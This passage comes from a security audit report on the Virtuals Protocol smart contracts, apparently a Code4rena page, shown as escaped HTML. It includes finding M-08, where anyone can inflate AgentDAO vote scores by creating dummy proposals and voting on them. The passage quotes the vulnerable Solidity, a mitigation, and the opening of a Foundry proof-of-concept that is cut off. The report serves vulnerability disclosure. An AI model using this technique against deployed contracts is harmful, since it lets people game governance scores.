class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Apply 3% slippage tolerance: amountOutMin = expectedAmountOut * 0.97\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\" style=\"position:relative;\"\u003e\u003ca href=\"#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\" aria-label=\"m 08 score in agentdao is not an accurate measure and can be artificially inflated by spamming proposals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-29\"\u003e[M-08] Score in \u003ccode\u003eAgentDAO\u003c/code\u003e is not an accurate measure and can be artificially inflated by spamming proposals\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-361\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-54\"\u003ekanra\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-253\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003eAgentDAO._castVote()\u003c/code\u003e, a user’s score is updated anytime they vote on a proposal. This is a problem because submitting a proposal is permissionless, and the default proposal threshold is 0.\u003c/p\u003e\n\u003cp\u003eIn addition, the user does not even need to hold any veTokens to vote and receive a score.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_castVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotedPreviously\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehasVoted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ++\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_scores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint48\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit-medium Anybody can create dummy proposal and vote to increase score\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eScore should not be used as a trustworthy parameter as long as submitting proposals is permissionless. Additionally, consider adding a check that \u003ccode\u003eweight \u003e 0\u003c/code\u003e before increasing a user’s score.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-10\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxPendingSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetSwapThresholdBasisPoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapThresholdBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan 